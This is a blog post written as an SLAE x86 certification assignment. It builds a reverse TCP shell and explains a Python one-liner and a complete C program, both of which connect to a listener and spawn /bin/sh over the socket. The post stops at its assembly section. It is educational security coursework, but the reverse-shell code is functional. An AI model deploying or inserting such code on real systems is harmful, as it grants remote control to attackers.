---
title: "SLAE x86 Exam - Assignment #2"
date: 2021-12-19
toc: true
search: false
classes: wide
categories:
  - blog
tags:
  - slae
  - assembly
  - nasm
  - c
  - exam
---

## Disclaimer

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:

<https://www.pentesteracademy.com/course?id=3>

Student ID: PA-30398

## Foreword

The second assignment requires you to write shellcode for a `Reverse Shell TCP`.

Follows the visual representation of this technique:

![TODO: INSERT IMAGE]()

## First Attempt

### C Source Code

Given that I didn't know how to write a Reverse Shell in C++, first I looked for a simple onliner in python (closest language I'm familiar with):

```bash
export RHOST="10.0.0.1"
export RPORT=4242
python -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1", 4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

Let's analyze the code:

```py
import socket, os, pty

s = socket.socket()
s.connect(("127.0.0.1", 4444))

# s.fileno() returns the File Descriptor associated with the socket
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]

pty.spawn("/bin/sh")
```

First, it creates a TCP socket and after that it connects to the socket `127.0.0.1:4444`.

Next, it uses the function `dup2` in order to redirect `stdin`, `stdout`, and `stderr` towards the socket.

Finally, it executes `/bin/sh`.

Let's see if my C++ version works:

```cpp
#include <netinet/ip.h>

int main() {
    int client_socket_fd;

    // define an array made up of 1 value: 0
    // this way I don't have to pass NULL pointers to execve
    char *empty[] = { 0 };
    struct sockaddr_in client_address;

    // create a TCP socket
    client_socket_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    // connect to 127.0.0.1:4444
    // where netcat is listening
    // /bin/sh -c "nc -v -l 4444"
    client_address.sin_family = AF_INET;

    // convert the IP address to an 'in_addr' struct
    inet_aton("127.0.0.1", &client_address.sin_addr);
    client_address.sin_port = htons(4444);

    // connect to the socket
    connect(client_socket_fd, (struct sockaddr *)&client_address, sizeof(client_address));

    // redirect stdin/stdout/stderr to the client socket
    dup2(client_socket_fd, 0);
    dup2(client_socket_fd, 1);
    dup2(client_socket_fd, 2);

    // now that the standard file descriptors are redirected
    // once we spawn /bin/sh, input/output/error are going to be bound
    //      to the client socket
    execve("/bin/sh", empty, empty);
}
```

The first part is similar to the previous assignment, however in this case we're not using the value `INADDR_ANY`, but we need a specific IP address to connect to.

I discovered that you can't just do the following:

```cpp
client_address.sin_addr.s_addr = "127.0.0.1";
```

The reason resides in the definition of the [ockaddr_in](https://man7.org/linux/man-pages/man7/ip.7.html):

```cpp
struct sockaddr_in {
    sa_family_t    sin_family; /* address family: AF_INET */
    in_port_t      sin_port;   /* port in network byte order */
    struct in_addr sin_addr;   /* internet address */
};

/* Internet address */
struct in_addr {
    uint32_t       s_addr;     /* address in network byte order */
};
```

The variable `sin_addr` isn't a string (or a `char` array), but it's of type `in_addr`, so we need to convert the string to `in_addr`.

According to [this reference](https://web.archive.org/web/20201128162706/https://www.gta.ufrj.br/ensino/eel878/sockets/inet_ntoaman.html), there are two options:

- `inet_addr`, which is an older function and in theorically it is deprected
- `inet_aton`, which is the recommended way

After that, the function `connect` is used to connect the server socket (the netcat listener running on the same machine), and input/output/error is redirected to the client socket through the use of the `dup2` function.

Lastly, the shell `/bin/sh` is spawned via `execve`. Here's what's different from my first attempt at the `Bind Shell TCP Shellcode`: it seems you don't need to manage receiving commands and executing them, like I did previously (in the first assignment) using the functions `recv`, and `system`.

In fact, after you correctly redirect input/output/error to the client file descriptor, and spawn a shell, everything is done automatically.

### Assembly Code

...